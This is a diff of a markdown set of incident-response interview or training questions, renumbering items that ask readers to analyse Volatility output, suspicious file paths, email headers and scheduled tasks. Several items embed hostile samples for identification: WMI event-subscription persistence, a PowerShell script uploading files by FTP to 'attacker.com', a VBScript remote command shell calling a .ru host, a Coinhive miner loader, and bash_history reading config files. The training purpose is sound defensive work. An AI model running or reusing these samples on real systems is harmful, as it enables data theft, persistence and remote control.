@@ -1,4 +1,4 @@
-## Analyze output from memory forensic tool. Can you see something suspicious?
+## 1. Analyze output from memory forensic tool. Can you see something suspicious?
 ```
 vol.py -f /home/john/MemoryDumps/rootkit.vmem pslist
 Volatility Foundation Volatility Framework 2.6.1
@@ -23,7 +23,7 @@ Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Star
 0x81863138 cmd.exe                2980   1444      0 --------      0      0 2023-06-24 07:31:16 UTC+0000
 ```
 
-## During incident investigation you found some interesting files tell me which one looks potentialy suspicious and why?
+## 2. During incident investigation you found some interesting files tell me which one looks potentialy suspicious and why?
 ```
 C:\Users\username\AppData\Local\Temp\cmd.exe
 C:\Users\username\AppData\Roaming\svchost.exe
@@ -43,7 +43,7 @@ C:\Recycle\Desktop.ini
 C:\Windows\Help\help.pdf.exe
 ```
 
-## Refer to below output which process requires additional analyzes? Explain why. Is there a possibility for False positives?
+## 3. Refer to below output which process requires additional analyzes? Explain why. Is there a possibility for False positives?
 ```
 Part 1.
 Volatility Foundation Volatility 2.6
@@ -53,7 +53,7 @@ Pid      Process              Start              End                Tag         
 1548     explorer.exe         0x0000000003000000 0x0000000003010000 VadS             PAGE_READWRITE
 
 ```
-## Analyze rest of it what potentaily is going on?
+## 4. Analyze rest of it what potentaily is going on?
 ```
 Details for VAD at 0x0000000002000000:
 ---------------------------------------------------
@@ -71,7 +71,7 @@ Detected PE file header at 0x2000000 in process explorer.exe.
 Possible injected code or reflective loading detected!
 ```
 
-## During investigation of command line transcript you noticed below commands, can you explain what is going on?
+## 5. During investigation of command line transcript you noticed below commands, can you explain what is going on?
 ```
 wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="EventFilter_MSEdgeUpdate", 
 Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'cmd.exe'", 
@@ -96,7 +96,7 @@ while ($true) {
 }
 ```
 
-## Identify language and script purpose.
+## 6. Identify language and script purpose.
 ```
 $ftpServer = "ftp://attacker.com"
 $ftpUser = "attacker"
@@ -110,7 +110,7 @@ $ftpRequest.GetRequestStream().Write($fileContent, 0, $fileContent.Length)
 $ftpRequest.GetResponse()
 ```
 
-## Identify language and script purpose.
+## 7. Identify language and script purpose.
 ```
 Set objSocket = CreateObject("MSWinsock.Winsock")
 objSocket.RemoteHost = "ms-win32-update-live.ru"
@@ -132,7 +132,7 @@ Function ExecuteCommand(command)
 End Function
 ```
 
-## Identify language and script purpose.
+## 8. Identify language and script purpose.
 ```
 var script = document.createElement("script");
 script.src = "https://cdn.jsdelivr.net/npm/coinhive@2.0.0/lib/coinhive.min.js";
@@ -144,7 +144,7 @@ script.onload = function() {
 };
 ```
 
-## Investigate below email headers. What can suggest that something is wrong?
+## 9. Investigate below email headers. What can suggest that something is wrong?
 ```
 Return-Path: <noreply@company.com>
 Received: from mail.server.com (mail.server.com [192.168.1.10]) by mail.mydomain.com with ESMTP id a1b2c3d4 for <recipient@mydomain.com>; Thu, 3 Dec 2024 10:02:05 -0500 (EST)
@@ -165,12 +165,12 @@ X-Spam-Status: Yes, score=8.5 required=5.0 tests=ALL_TRUSTED,HTML_MESSAGE,SPF_FA
 X-Phishing-Alert: Potential Phishing Attempt Detected
 ```
 
-##
+## 10. You noticed that user executed following command, can it be dangerous?
 ```
 schtasks /create /tn "UpdateTask" /tr "C:\Windows\System32\cmd.exe /c C:\Users\Public\update.bat" /sc once /st 00:00 /ru SYSTEM
 ```
 
-## Analyze output from below command. What may be worth investigating?
+## 11. Analyze output from below command. What may be worth investigating?
 ```
 Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName 
 
@@ -186,7 +186,7 @@ SystemUpdateService System Update Service      Running  Auto        C:\Windows\T
 UdkUserSvc_268339   Udk User Service_268339    Stopped  Manual      C:\Windows\System32\svchost.exe -k UdkSvcGroup
 ```
 
-## Investigate output of bash_history can you tell me what user tried to acheive here?
+## 12. Investigate output of bash_history can you tell me what user tried to acheive here?
 ```
 ls -alh /home/user
 find / -name "config*" -exec cat {} \;
